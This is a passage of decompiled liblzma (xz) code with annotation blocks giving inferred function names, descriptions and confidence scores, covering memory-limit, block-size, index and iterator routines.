  }
  return local_20;
}



/**
 * @name  lzma_memlimit_get
 * @brief Gets the current memory limit of an LZMA stream via memconfig callback.
 * @confidence 92%
 * @classification utility
 * @address 0x00105800
 */

/* Gets memory limit of LZMA stream */

undefined8 lzma_memlimit_get(long param_1)

{
  undefined8 *puVar1;
  int iVar2;
  long in_FS_OFFSET;
  undefined8 local_20;
  undefined1 local_18 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if ((((param_1 == 0) || (puVar1 = *(undefined8 **)(param_1 + 0x38), puVar1 == (undefined8 *)0x0))
      || ((code *)puVar1[7] == (code *)0x0)) ||
     (iVar2 = (*(code *)puVar1[7])(*puVar1,local_18,&local_20,0), iVar2 != 0)) {
    local_20 = 0;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_20;
}



/**
 * @name  lzma_memlimit_set
 * @brief Sets memory limit for LZMA stream. Treats 0 as 1 (minimum). Calls memconfig callback.
 * @confidence 92%
 * @classification utility
 * @address 0x00105870
 */

/* Sets memory limit for LZMA stream by calling allocator function pointer with validated stream */

undefined8 lzma_memlimit_set(long param_1,long param_2)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  long lVar3;
  long in_FS_OFFSET;
  undefined1 local_20 [8];
  undefined1 local_18 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (((param_1 == 0) || (puVar1 = *(undefined8 **)(param_1 + 0x38), puVar1 == (undefined8 *)0x0))
     || ((code *)puVar1[7] == (code *)0x0)) {
    uVar2 = 0xb;
  }
  else {
    lVar3 = 1;
    if (param_2 != 0) {
      lVar3 = param_2;
    }
    uVar2 = (*(code *)puVar1[7])(*puVar1,local_18,local_20,lVar3);
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_block_unpadded_size
 * @brief Calculates unpadded size of an LZMA block from header, compressed, and check sizes with overflow checks.
 * @confidence 92%
 * @classification utility
 * @address 0x001058e0
 */

/* Calculates unpadded size of LZMA block. Validates header fields (compressed/check sizes),
   combines header size, compressed size, and check size with overflow checks. */

ulong lzma_block_unpadded_size(uint *param_1)

{
  uint uVar1;
  uint uVar2;
  ulong uVar3;
  
  uVar3 = 0;
  if (param_1 == (uint *)0x0) {
    return 0;
  }
  if (*param_1 < 2) {
    uVar1 = param_1[1];
    if ((uVar1 - 8 < 0x3f9) && ((uVar1 & 3) == 0)) {
      uVar3 = *(ulong *)(param_1 + 4);
      if ((uVar3 + 0x8000000000000000 < 0x7fffffffffffffff) || ((uVar3 == 0 || (0xf < param_1[2]))))
      {
        return 0;
      }
      if (uVar3 != 0xffffffffffffffff) {
        uVar2 = lzma_check_size();
        uVar3 = (ulong)uVar2 + uVar1 + uVar3;
        if (0x7ffffffffffffffc < uVar3) {
          uVar3 = 0;
        }
        return uVar3;
      }
    }
    return uVar3;
  }
  return 0;
}



/**
 * @name  lzma_block_compressed_size
 * @brief Calculates compressed size of a block from unpadded size, header size, and check size.
 * @confidence 90%
 * @classification utility
 * @address 0x00105980
 */

/* Calculates the compressed size of a block including headers and checksum, validating against
   available stream size. */

undefined8 lzma_block_compressed_size(long param_1,ulong param_2)

{
  int iVar1;
  long lVar2;
  ulong uVar3;
  undefined8 uVar4;
  
  lVar2 = lzma_block_unpadded_size();
  uVar4 = 0xb;
  if (lVar2 != 0) {
    iVar1 = lzma_check_size(*(undefined4 *)(param_1 + 8));
    uVar3 = (ulong)(uint)(iVar1 + *(int *)(param_1 + 4));
    uVar4 = 9;
    if (uVar3 < param_2) {
      lVar2 = param_2 - uVar3;
      if ((*(long *)(param_1 + 0x10) == -1) || (*(long *)(param_1 + 0x10) == lVar2)) {
        *(long *)(param_1 + 0x10) = lVar2;
        uVar4 = 0;
      }
    }
  }
  return uVar4;
}



/**
 * @name  lzma_block_total_size
 * @brief Calculates block total size by padding unpadded size to 4-byte alignment
 * @confidence 90%
 * @classification utility
 * @address 0x001059e0
 */

/* Calculates block total size by padding unpadded size to 4-byte alignment */

ulong lzma_block_total_size(void)

{
  ulong uVar1;
  
  uVar1 = lzma_block_unpadded_size();
  if (uVar1 != 0xffffffffffffffff) {
    uVar1 = uVar1 + 3 & 0xfffffffffffffffc;
  }
  return uVar1;
}



/**
 * @name  lzma_validate_filter_chain
 * @brief Validates a filter chain: checks each filter ID against allowed types, verifies chain constraints (max 4 filters, ordering rules).
 * @confidence 72%
 * @classification utility
 * @address 0x00105a60
 */

undefined8 FUN_00105a60(long *param_1,ulong *param_2)

{
  long lVar1;
  undefined8 uVar2;
  long lVar3;
  long *plVar4;
  long lVar5;
  ulong uVar6;
  char cVar7;
  ulong uVar8;
  
  lVar5 = *param_1;
  uVar6 = 0;
  cVar7 = '\x01';
  uVar8 = 0;
  do {
    if (lVar5 == 0x4000000000000001) {
      lVar3 = 0;
    }
    else {
      lVar3 = 0;
      lVar1 = 0x4000000000000002;
      plVar4 = &filter_id_options_table;
      while (lVar3 = lVar3 + 1, lVar5 != lVar1) {
        if (lVar1 == -1) goto LAB_00105abe;
        lVar1 = *plVar4;
        plVar4 = plVar4 + 3;
      }
    }
    if (cVar7 == '\0') goto LAB_00105abe;
    uVar6 = uVar6 + 1;
    lVar3 = lVar3 * 0x18;
    cVar7 = (&DAT_001230b0)[lVar3];
    uVar8 = uVar8 + (byte)(&DAT_001230b2)[lVar3];
    lVar5 = param_1[uVar6 * 2];
  } while (lVar5 != -1);
  if ((uVar8 < 4 && uVar6 < 5) && ((&UNK_001230b1)[lVar3] == '\x01')) {
    *param_2 = uVar6;
    uVar2 = 0;
  }
  else {
LAB_00105abe:
    uVar2 = 8;
  }
  return uVar2;
}



/**
 * @name  lzma_raw_coder_memusage
 * @brief Validates filter pointer then delegates to internal memusage calculation
 * @confidence 80%
 * @classification utility
 * @address 0x00105db0
 */

/* Validates filter pointer then delegates to memusage calculation */

undefined8 lzma_raw_coder_memusage(long *param_1)

{
  undefined8 uVar1;
  
  if ((param_1 != (long *)0x0) && (*param_1 != -1)) {
    uVar1 = FUN_00105a60();
    return uVar1;
  }
  return 0xb;
}



/**
 * @name  lzma_raw_coder_memusage
 * @brief Calculates total memory usage for a raw coder by iterating filters, calling finder for each, summing results.
 * @confidence 75%
 * @classification utility
 * @address 0x00105fb0
 */

long FUN_00105fb0(code *param_1,long *param_2)

{
  int iVar1;
  long lVar2;
  long lVar3;
  long lVar4;
  long in_FS_OFFSET;
  undefined1 auStack_28 [8];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if ((param_2 != (long *)0x0) && (*param_2 != -1)) {
    iVar1 = FUN_00105a60(param_2,auStack_28);
    if (iVar1 == 0) {
      lVar3 = *param_2;
      lVar4 = 0;
      param_2 = param_2 + 1;
      do {
        while( true ) {
          lVar3 = (*param_1)(lVar3);
          if (lVar3 == 0) goto LAB_00106050;
          if (*(code **)(lVar3 + 0x10) != (code *)0x0) break;
          lVar3 = param_2[1];
          param_2 = param_2 + 2;
          lVar4 = lVar4 + 0x400;
          if (lVar3 == -1) goto LAB_00106042;
        }
        lVar2 = (**(code **)(lVar3 + 0x10))(*param_2);
        if (lVar2 == -1) goto LAB_00106050;
        lVar3 = param_2[1];
        param_2 = param_2 + 2;
        lVar4 = lVar4 + lVar2;
      } while (lVar3 != -1);
LAB_00106042:
      lVar4 = lVar4 + 0x8000;
      goto LAB_00106057;
    }
  }
LAB_00106050:
  lVar4 = -1;
LAB_00106057:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return lVar4;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_index_tree_append
 * @brief Inserts a node into an implicit binary tree structure, rebalancing by rotating nodes based on count.
 * @confidence 78%
 * @classification utility
 * @address 0x00106220
 */

/* Inserts a new node into a list structure. Appends to the tail, increments count, and performs
   rebalancing by moving a node from a calculated position based on the binary representation of the
   count. Resembles a self-organizing list or implicit tree structure rather than a classic skip
   list. */

void skiplist_insert_node(long *param_1,long param_2)

{
  long lVar1;
  long lVar2;
  uint uVar3;
  int iVar4;
  long lVar5;
  
  lVar5 = param_1[3];
  lVar1 = param_1[2];
  *(undefined8 *)(param_2 + 0x18) = 0;
  *(undefined8 *)(param_2 + 0x20) = 0;
  uVar3 = (int)lVar5 + 1;
  lVar5 = *param_1;
  *(long *)(param_2 + 0x10) = lVar1;
  *(uint *)(param_1 + 3) = uVar3;
  if (lVar5 != 0) {
    *(long *)(lVar1 + 0x20) = param_2;
    iVar4 = 0x1f;
    if (uVar3 != 0) {
      for (; uVar3 >> iVar4 == 0; iVar4 = iVar4 - 1) {
      }
    }
    param_1[2] = param_2;
    if (uVar3 != 1 << ((byte)iVar4 & 0x1f)) {
      iVar4 = 0;
      for (; (uVar3 & 1) == 0; uVar3 = uVar3 >> 1 | 0x80000000) {
        iVar4 = iVar4 + 1;
      }
      iVar4 = iVar4 + 2;
      do {
        lVar5 = lVar1;
        lVar1 = *(long *)(lVar5 + 0x10);
        iVar4 = iVar4 - 1;
      } while (iVar4 != 0);
      lVar2 = *(long *)(lVar5 + 0x20);
      if (lVar1 == 0) {
        *param_1 = lVar2;
      }
      else {
        *(long *)(lVar1 + 0x20) = lVar2;
      }
      *(long *)(lVar2 + 0x10) = lVar1;
      lVar1 = *(long *)(lVar2 + 0x18);
      *(long *)(lVar5 + 0x20) = lVar1;
      if (lVar1 != 0) {
        *(long *)(lVar1 + 0x10) = lVar5;
      }
      *(long *)(lVar2 + 0x18) = lVar5;
      *(long *)(lVar5 + 0x10) = lVar2;
    }
    return;
  }
  *param_1 = param_2;
  param_1[1] = param_2;
  param_1[2] = param_2;
  return;
}



/**
 * @name  lzma_index_tree_get_last_leaf
 * @brief Traverses tree rightward to find last/rightmost leaf, validating parent pointers
 * @confidence 70%
 * @classification utility
 * @address 0x00106580
 */

/* Traverses right children at offset 0x10, validates parent at 0x20 */

void lzma_index_tree_get_last_leaf(long param_1)

{
  long lVar1;
  bool bVar2;
  
  do {
    lVar1 = *(long *)(param_1 + 0x10);
    if (lVar1 == 0) {
      return;
    }
    bVar2 = param_1 == *(long *)(lVar1 + 0x20);
    param_1 = lVar1;
  } while (bVar2);
  return;
}



/**
 * @name  lzma_index_set_uncompressed_limit
 * @brief Sets uncompressed size limit on index, clamped to max VLI value
 * @confidence 75%
 * @classification utility
 * @address 0x00106650
 */

/* Sets uncompressed size limit at offset 0x40, clamped to max VLI */

void lzma_index_set_uncompressed_limit(long param_1,ulong param_2)

{
  if (0xffffffffffffffb < param_2) {
    param_2 = 0xffffffffffffffb;
  }
  *(ulong *)(param_1 + 0x40) = param_2;
  return;
}



/**
 * @name  lzma_index_memusage
 * @brief Calculates memory needed for index: per-stream 0x128 bytes + per-block-group 0x2060 + 0x70 overhead
 * @confidence 90%
 * @classification utility
 * @address 0x00106670
 */

/* Calculates memory required for index given stream/block counts */

long lzma_index_memusage(long param_1,ulong param_2)

{
  long lVar1;
  ulong uVar2;
  
  lVar1 = -1;
  if (((param_1 - 1U < 0xffffffff) && (param_2 < 0xfd08e5500fd0801)) &&
     (uVar2 = (param_2 + 0x1ff >> 9) * 0x2060, uVar2 <= param_1 * -0x128 - 0x71U)) {
    lVar1 = uVar2 + 0x70 + param_1 * 0x128;
  }
  return lVar1;
}



/**
 * @name  lzma_index_size
 * @brief Calculates total LZMA index section size with VLI encoding and 4-byte alignment
 * @confidence 90%
 * @classification utility
 * @address 0x00106700
 */

/* Calculates total LZMA index size with VLI encoding and 4-byte alignment */

ulong lzma_index_size(long param_1)

{
  int iVar1;
  
  iVar1 = lzma_vli_size(*(undefined8 *)(param_1 + 0x30));
  return *(long *)(param_1 + 0x38) + 7 + (ulong)(iVar1 + 1) & 0xfffffffffffffffc;
}



/**
 * @name  lzma_index_stream_size
 * @brief Calculates total XZ stream size: 24 bytes headers + blocks + aligned index size
 * @confidence 85%
 * @classification utility
 * @address 0x00106740
 */

/* Calculates total stream size from index (header+index+blocks+footer) */

long lzma_index_stream_size(long param_1)

{
  int iVar1;
  
  iVar1 = lzma_vli_size(*(undefined8 *)(param_1 + 0x30));
  return (*(long *)(param_1 + 0x38) + 7 + (ulong)(iVar1 + 1) & 0xfffffffffffffffc) + 0x18 +
         *(long *)(param_1 + 0x28);
}



/**
 * @name  lzma_index_file_size
 * @brief Calculates total file size from index: sums stream data, 0x18-byte headers/footers, index records, padding, with overflow checks.
 * @confidence 90%
 * @classification utility
 * @address 0x00106770
 */

/* Calculates total LZMA file size from index structure. Combines stream sizes, block data, footer
   (0x18 bytes), index, and padding alignments. */

long lzma_index_file_size(long param_1)

{
  long lVar1;
  long lVar2;
  int iVar3;
  long lVar4;
  ulong uVar5;
  
  uVar5 = 0;
  lVar1 = *(long *)(param_1 + 0x10);
  lVar4 = *(long *)(lVar1 + 0x48);
  lVar2 = *(long *)(lVar1 + 0x60);
  if (lVar4 != 0) {
    uVar5 = *(long *)(*(long *)(lVar4 + 0x38) * 0x10 + 0x48 + lVar4) + 3U & 0xfffffffffffffffc;
  }
  lVar4 = uVar5 + 0x18 + *(long *)(lVar1 + 0xa0) + *(long *)(lVar1 + 8);
  if (-1 < lVar4) {
    iVar3 = lzma_vli_size(*(undefined8 *)(lVar1 + 0x58));
    lVar4 = (lVar2 + 7 + (ulong)(iVar3 + 1) & 0xfffffffffffffffc) + lVar4;
    if (lVar4 < 0) {
      lVar4 = -1;
    }
    return lVar4;
  }
  return -1;
}



/**
 * @name  lzma_index_checks
 * @brief Returns bitmask of all integrity check types used in the index
 * @confidence 85%
 * @classification utility
 * @address 0x00106810
 */

/* Returns bitmask of check types used in index */

uint lzma_index_checks(long param_1)

{
  uint uVar1;
  
  uVar1 = *(uint *)(param_1 + 0x48);
  if (*(int *)(*(long *)(param_1 + 0x10) + 0x68) != -1) {
    uVar1 = uVar1 | 1 << ((byte)*(undefined4 *)(*(long *)(param_1 + 0x10) + 0x78) & 0x1f);
  }
  return uVar1;
}



/**
 * @name  lzma_index_padding_size
 * @brief Calculates padding needed for 4-byte alignment of index data
 * @confidence 85%
 * @classification utility
 * @address 0x00106830
 */

/* Calculates index padding size for 4-byte alignment */

uint lzma_index_padding_size(long param_1)

{
  uint uVar1;
  
  uVar1 = lzma_vli_size(*(undefined8 *)(param_1 + 0x30));
  return ~uVar1 - *(int *)(param_1 + 0x38) & 3;
}



/**
 * @name  lzma_index_stream_flags
 * @brief Sets stream flags for an LZMA index: validates flags via comparison, copies 7 qwords to internal structure.
 * @confidence 90%
 * @classification utility
 * @address 0x00106850
 */

/* Sets stream flags for an LZMA index structure. Validates flags via comparison and stores them at
   specific offsets within the index's internal data structure. */

undefined8 lzma_index_stream_flags(long param_1,undefined8 *param_2)

{
  long lVar1;
  undefined8 uVar2;
  long uVar3;
  
  if (param_1 == 0) {
    return 0xb;
  }
  if (param_2 != (undefined8 *)0x0) {
    uVar3 = lzma_stream_flags_compare(param_2);
    if ((int)uVar3 == 0) {
      lVar1 = *(long *)(param_1 + 0x10);
      uVar2 = param_2[1];
      *(undefined8 *)(lVar1 + 0x68) = *param_2;
      *(undefined8 *)(lVar1 + 0x70) = uVar2;
      uVar2 = param_2[3];
      *(undefined8 *)(lVar1 + 0x78) = param_2[2];
      *(undefined8 *)(lVar1 + 0x80) = uVar2;
      uVar2 = param_2[5];
      *(undefined8 *)(lVar1 + 0x88) = param_2[4];
      *(undefined8 *)(lVar1 + 0x90) = uVar2;
      *(undefined8 *)(lVar1 + 0x98) = param_2[6];
    }
    return uVar3;
  }
  return 0xb;
}



/**
 * @name  lzma_index_stream_padding
 * @brief Sets stream padding in index, validates 4-byte alignment and checks for overflow.
 * @confidence 90%
 * @classification utility
 * @address 0x001068d0
 */

/* Sets stream padding in index, validates 4-byte alignment */

undefined8 lzma_index_stream_padding(long param_1,ulong param_2)

{
  long lVar1;
  undefined8 uVar2;
  long lVar3;
  
  if (param_1 != 0) {
    uVar2 = 0xb;
    if ((-1 < (long)param_2) && ((param_2 & 3) == 0)) {
      lVar1 = *(long *)(param_1 + 0x10);
      uVar2 = *(undefined8 *)(lVar1 + 0xa0);
      *(undefined8 *)(lVar1 + 0xa0) = 0;
      lVar3 = lzma_index_file_size();
      if ((long)(lVar3 + param_2) < 0) {
        *(undefined8 *)(lVar1 + 0xa0) = uVar2;
        uVar2 = 9;
      }
      else {
        *(ulong *)(lVar1 + 0xa0) = param_2;
        uVar2 = 0;
      }
    }
    return uVar2;
  }
  return 0xb;
}



/**
 * @name  lzma_index_append
 * @brief Appends a new record to LZMA index. Validates sizes, computes padded sizes, checks overflow, allocates new index groups with capacity doubling, updates cumulative size counters and record count.
 * @confidence 95%
 * @classification utility
 * @address 0x00106940
 */

/* Appends a new record to an LZMA index structure. Validates sizes, computes padded sizes (4-byte
   alignment), calculates total index size to check overflow, allocates new index groups when needed
   (with capacity doubling to 0x200), and updates cumulative compressed/uncompressed size counters
   and record count. */

undefined8 lzma_index_append(long param_1,undefined8 param_2,ulong param_3,long param_4)

{
  long lVar1;
  long lVar2;
  int iVar3;
  int iVar4;
  undefined8 uVar5;
  ulong uVar6;
  long *plVar7;
  ulong uVar8;
  long lVar9;
  long lVar10;
  ulong local_70;
  long local_68;
  long local_60;
  ulong local_58;
  long local_50;
  
  if ((0x7ffffffffffffff7 < param_3 - 5) || (param_1 == 0)) {
    return 0xb;
  }
  if (param_4 < 0) {
    return 0xb;
  }
  lVar1 = *(long *)(param_1 + 0x10);
  plVar7 = *(long **)(lVar1 + 0x48);
  if (plVar7 == (long *)0x0) {
    local_50 = 0;
    local_58 = 0;
    local_70 = param_3;
    local_68 = param_4;
  }
  else {
    local_50 = plVar7[plVar7[7] * 2 + 8];
    local_58 = plVar7[plVar7[7] * 2 + 9] + 3U & 0xfffffffffffffffc;
    local_68 = local_50 + param_4;
    if (local_68 < 0) {
      return 9;
    }
    local_70 = param_3 + local_58;
    if (0x7ffffffffffffffc < local_70) {
      return 9;
    }
  }
  iVar3 = lzma_vli_size(param_4);
  iVar4 = lzma_vli_size(param_3);
  local_60 = *(long *)(lVar1 + 0x60);
  uVar8 = (ulong)(uint)(iVar3 + iVar4);
  lVar10 = *(long *)(lVar1 + 0x58) + 1;
  lVar9 = *(long *)(lVar1 + 8) + *(long *)(lVar1 + 0xa0) + 0x18 +
          (local_70 + 3 & 0xfffffffffffffffc);
  if ((-1 < lVar9) &&
     (iVar3 = lzma_vli_size(lVar10),
     -1 < (long)(((ulong)(iVar3 + 1) + local_60 + 7 + uVar8 & 0xfffffffffffffffc) + lVar9))) {
    lVar2 = *(long *)(param_1 + 0x30);
    lVar9 = *(long *)(param_1 + 0x38);
    iVar3 = lzma_vli_size();
    uVar5 = 9;
    if ((uVar8 + 7 + lVar9 + (ulong)(iVar3 + 1) & 0xfffffffffffffffc) < 0x400000001) {
      if ((plVar7 == (long *)0x0) || (uVar6 = plVar7[7] + 1, (ulong)plVar7[6] <= uVar6)) {
        plVar7 = (long *)lzma_alloc((*(long *)(param_1 + 0x40) + 4) * 0x10,param_2);
        if (plVar7 == (long *)0x0) {
          return 5;
        }
        plVar7[7] = 0;
        plVar7[6] = *(long *)(param_1 + 0x40);
        *(undefined8 *)(param_1 + 0x40) = 0x200;
        *plVar7 = local_50;
        plVar7[1] = local_58;
        plVar7[5] = *(long *)(lVar1 + 0x58) + 1;
        skiplist_insert_node(lVar1 + 0x38,plVar7);
        lVar2 = *(long *)(param_1 + 0x30);
        uVar6 = plVar7[7];
        lVar9 = *(long *)(param_1 + 0x38);
        lVar10 = *(long *)(lVar1 + 0x58) + 1;
        local_60 = *(long *)(lVar1 + 0x60);
      }
      else {
        plVar7[7] = uVar6;
      }
      plVar7[uVar6 * 2 + 8] = local_68;
      plVar7[uVar6 * 2 + 9] = local_70;
      *(long *)(lVar1 + 0x58) = lVar10;
      *(ulong *)(lVar1 + 0x60) = local_60 + uVar8;
      uVar5 = 0;
      *(long *)(param_1 + 0x28) = *(long *)(param_1 + 0x28) + (param_3 + 3 & 0xfffffffffffffffc);
      *(long *)(param_1 + 0x20) = *(long *)(param_1 + 0x20) + param_4;
      *(long *)(param_1 + 0x30) = lVar2 + 1;
      *(ulong *)(param_1 + 0x38) = uVar8 + lVar9;
    }
    return uVar5;
  }
  return 9;
}



/**
 * @name  lzma_index_cat
 * @brief Concatenates two LZMA index structures. Validates combined sizes, potentially reallocates last group, accumulates statistics from source tree, merges counters and check types, frees source.
 * @confidence 95%
 * @classification utility
 * @address 0x00106c50
 */

/* Concatenates two LZMA index structures. Validates that combined file sizes don't overflow, checks
   that the combined index size fits within limits, potentially reallocates the last group node to
   accommodate merging, then recursively accumulates statistics from the source index tree into the
   destination. Finally merges counters (streams, blocks, compressed/uncompressed sizes, check
   types) and frees the source index. */

undefined8 lzma_index_cat(long param_1,undefined8 *param_2,undefined8 param_3)

{
  long lVar1;
  undefined8 *puVar2;
  int iVar3;
  int iVar4;
  undefined4 uVar5;
  long lVar6;
  long lVar7;
  undefined8 *puVar8;
  undefined8 uVar9;
  undefined8 uVar10;
  long in_FS_OFFSET;
  long local_70;
  long local_68;
  long local_60;
  undefined8 local_58;
  undefined4 local_50;
  long local_48;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if ((param_1 == 0) || (param_2 == (undefined8 *)0x0)) {
    uVar9 = 0xb;
  }
  else {
    lVar6 = lzma_index_file_size();
    lVar7 = lzma_index_file_size(param_2);
    if ((lVar7 + lVar6 < 0) || (local_70 = *(long *)(param_1 + 0x20), local_70 + param_2[4] < 0)) {
      uVar9 = 9;
    }
    else {
      uVar10 = *(undefined8 *)(param_1 + 0x30);
      iVar3 = lzma_vli_size(uVar10);
      iVar4 = lzma_vli_size(param_2[6]);
      uVar9 = 9;
      if ((*(long *)(param_1 + 0x38) + param_2[7] + 0xb + (ulong)(iVar3 + 1) + (ulong)(iVar4 + 1) &
          0xfffffffffffffffc) < 0x400000001) {
        lVar7 = *(long *)(param_1 + 0x10);
        puVar2 = *(undefined8 **)(lVar7 + 0x48);
        if ((puVar2 != (undefined8 *)0x0) && (puVar2[7] + 1 < (ulong)puVar2[6])) {
          puVar8 = (undefined8 *)lzma_alloc((puVar2[7] + 5) * 0x10,param_3);
          if (puVar8 == (undefined8 *)0x0) {
            uVar9 = 5;
            goto LAB_00106d95;
          }
          uVar9 = puVar2[1];
          *puVar8 = *puVar2;
          puVar8[1] = uVar9;
          uVar9 = puVar2[3];
          puVar8[2] = puVar2[2];
          puVar8[3] = uVar9;
          puVar8[4] = puVar2[4];
          lVar1 = puVar2[7] + 1;
          puVar8[7] = puVar2[7];
          uVar9 = puVar2[5];
          puVar8[6] = lVar1;
          puVar8[5] = uVar9;
          memcpy(puVar8 + 8,puVar2 + 8,lVar1 * 0x10);
          if (puVar2[2] != 0) {
            *(undefined8 **)(puVar2[2] + 0x20) = puVar8;
          }
          if (*(undefined8 **)(lVar7 + 0x40) == puVar2) {
            *(undefined8 **)(lVar7 + 0x40) = puVar8;
            *(undefined8 **)(lVar7 + 0x38) = puVar8;
          }
          *(undefined8 **)(lVar7 + 0x48) = puVar8;
          lzma_free(puVar2,param_3);
          local_70 = *(long *)(param_1 + 0x20);
          uVar10 = *(undefined8 *)(param_1 + 0x30);
        }
        uVar5 = lzma_index_checks(param_1);
        uVar9 = *param_2;
        *(undefined4 *)(param_1 + 0x48) = uVar5;
        local_68 = local_70;
        local_50 = *(undefined4 *)(param_1 + 0x18);
        local_60 = lVar6;
        local_58 = uVar10;
        local_48 = param_1;
        lzma_index_stream_accumulate(&local_68,uVar9);
        *(long *)(param_1 + 0x20) = *(long *)(param_1 + 0x20) + param_2[4];
        *(long *)(param_1 + 0x28) = *(long *)(param_1 + 0x28) + param_2[5];
        *(long *)(param_1 + 0x30) = *(long *)(param_1 + 0x30) + param_2[6];
        *(long *)(param_1 + 0x38) = *(long *)(param_1 + 0x38) + param_2[7];
        *(uint *)(param_1 + 0x48) = *(uint *)(param_1 + 0x48) | *(uint *)(param_2 + 9);
        lzma_free(param_2,param_3);
        uVar9 = 0;
      }
    }
  }
LAB_00106d95:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar9;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_index_iter_rewind
 * @brief Resets iterator state by zeroing 4 fields at offsets 0x108-0x120
 * @confidence 90%
 * @classification utility
 * @address 0x001070e0
 */

/* Resets iterator state by zeroing fields at offsets 0x108-0x120 */

void lzma_index_iter_rewind(long param_1)

{
  *(undefined8 *)(param_1 + 0x108) = 0;
  *(undefined8 *)(param_1 + 0x110) = 0;
  *(undefined8 *)(param_1 + 0x118) = 0;
  *(undefined8 *)(param_1 + 0x120) = 0;
  return;
}



/**
 * @name  lzma_index_iter_next
 * @brief Advances LZMA index iterator to next element. Mode: 0=any, 1=stream, 2=block, 3=non-empty block. Returns 0 on success, 1 when exhausted. Traverses binary tree of index nodes.
 * @confidence 95%
 * @classification utility
 * @address 0x00107130
 */

/* Advances an LZMA index iterator to the next element. Mode values: 0=any, 1=stream, 2=block,
   3=non-empty block. Returns 0 on success, 1 when no more items. Traverses a binary tree structure
   of index nodes. */

undefined8 lzma_index_iter_next(long param_1,uint param_2)

{
  long lVar1;
  long *plVar2;
  ulong uVar3;
  long lVar4;
  long *plVar5;
  ulong uVar6;
  long lVar7;
  
  if (3 < param_2) {
    return 1;
  }
  lVar7 = *(long *)(param_1 + 0x100);
  lVar4 = *(long *)(param_1 + 0x108);
  uVar3 = *(ulong *)(param_1 + 0x118);
  plVar5 = (long *)0x0;
  if (param_2 == 1) goto LAB_001071c4;
  lVar1 = *(long *)(param_1 + 0x120);
  if (lVar1 == 1) {
    plVar2 = *(long **)(*(long *)(param_1 + 0x110) + 0x20);
    if (plVar2 == (long *)0x0) {
      plVar5 = (long *)lzma_index_tree_get_last_leaf();
      goto LAB_001071c4;
    }
    do {
      plVar5 = plVar2;
      plVar2 = (long *)plVar5[3];
      if ((long *)plVar5[3] == (long *)0x0) goto LAB_001071c4;
    } while( true );
  }
  if (lVar1 == 2) {
    plVar5 = *(long **)(lVar4 + 0x40);
    goto LAB_001071c4;
  }
  if (lVar1 != 0) goto LAB_001071c4;
  plVar5 = *(long **)(param_1 + 0x110);
  uVar6 = uVar3;
  if (lVar4 == 0) goto LAB_001071c9;
  do {
    if (plVar5 == (long *)0x0) {
      do {
        lVar1 = *(long *)(lVar4 + 0x20);
        if (*(long *)(lVar4 + 0x20) == 0) {
          lVar4 = lzma_index_tree_get_last_leaf(lVar4);
          if (lVar4 == 0) {
            return 1;
          }
          plVar5 = *(long **)(lVar4 + 0x40);
        }
        else {
          do {
            lVar4 = lVar1;
            lVar1 = *(long *)(lVar4 + 0x18);
          } while (*(long *)(lVar4 + 0x18) != 0);
          plVar5 = *(long **)(lVar4 + 0x40);
        }
        if (param_2 < 2) goto LAB_0010725d;
joined_r0x001072eb:
      } while (plVar5 == (long *)0x0);
    }
    else {
      if (uVar6 < (ulong)plVar5[7]) {
        uVar3 = uVar6 + 1;
        if (param_2 == 3) {
          if (uVar3 == 0) goto LAB_001071df;
          if (plVar5[uVar6 * 2 + 8] == plVar5[uVar6 * 2 + 10]) goto LAB_001071c4;
        }
LAB_001071ed:
        *(long **)(param_1 + 0x110) = plVar5;
        *(ulong *)(param_1 + 0x118) = uVar3;
        *(long *)(param_1 + 0x108) = lVar4;
        FUN_00106320(param_1);
        return 0;
      }
      plVar2 = (long *)plVar5[4];
      if ((long *)plVar5[4] == (long *)0x0) {
        plVar5 = (long *)lzma_index_tree_get_last_leaf();
        goto joined_r0x001072eb;
      }
      do {
        plVar5 = plVar2;
        plVar2 = (long *)plVar5[3];
      } while ((long *)plVar5[3] != (long *)0x0);
    }
    while( true ) {
      if (param_2 != 3) goto LAB_0010725d;
LAB_001071df:
      uVar3 = 0;
      if (*plVar5 != plVar5[8]) goto LAB_001071ed;
LAB_001071c4:
      uVar6 = uVar3;
      if (lVar4 != 0) break;
LAB_001071c9:
      lVar4 = *(long *)(lVar7 + 8);
      plVar5 = *(long **)(lVar4 + 0x40);
      if (1 < param_2) {
        while (plVar5 == (long *)0x0) {
          lVar1 = *(long *)(lVar4 + 0x20);
          if (*(long *)(lVar4 + 0x20) == 0) {
            lVar4 = lzma_index_tree_get_last_leaf(lVar4);
            if (lVar4 == 0) {
              return 1;
            }
            plVar5 = *(long **)(lVar4 + 0x40);
          }
          else {
            do {
              lVar4 = lVar1;
              lVar1 = *(long *)(lVar4 + 0x18);
            } while (*(long *)(lVar4 + 0x18) != 0);
            plVar5 = *(long **)(lVar4 + 0x40);
          }
        }
      }
    }
  } while( true );
LAB_0010725d:
  uVar3 = 0;
  goto LAB_001071ed;
}



/**
 * @name  lzma_index_iter_locate
 * @brief Locates a target offset in an LZMA index using two-level binary tree search and binary search within records.
 * @confidence 90%
 * @classification utility
 * @address 0x00107340
 */

/* Locates a target offset within an LZMA index using a two-level binary tree search followed by
   binary search within a record array. First finds the stream group, then finds the block group,
   then binary searches within records. Stores results at iter+0x108, iter+0x110, iter+0x118 and
   calls a helper to populate the iterator. */

undefined8 lzma_index_iter_locate(long param_1,ulong param_2)

{
  ulong *puVar1;
  code *pcVar2;
  ulong *puVar3;
  ulong uVar4;
  ulong uVar5;
  ulong *puVar6;
  ulong uVar7;
  ulong *puVar8;
  
  if ((ulong)(*(long **)(param_1 + 0x100))[4] <= param_2) {
    return 1;
  }
  puVar1 = (ulong *)**(long **)(param_1 + 0x100);
  if (puVar1 == (ulong *)0x0) {
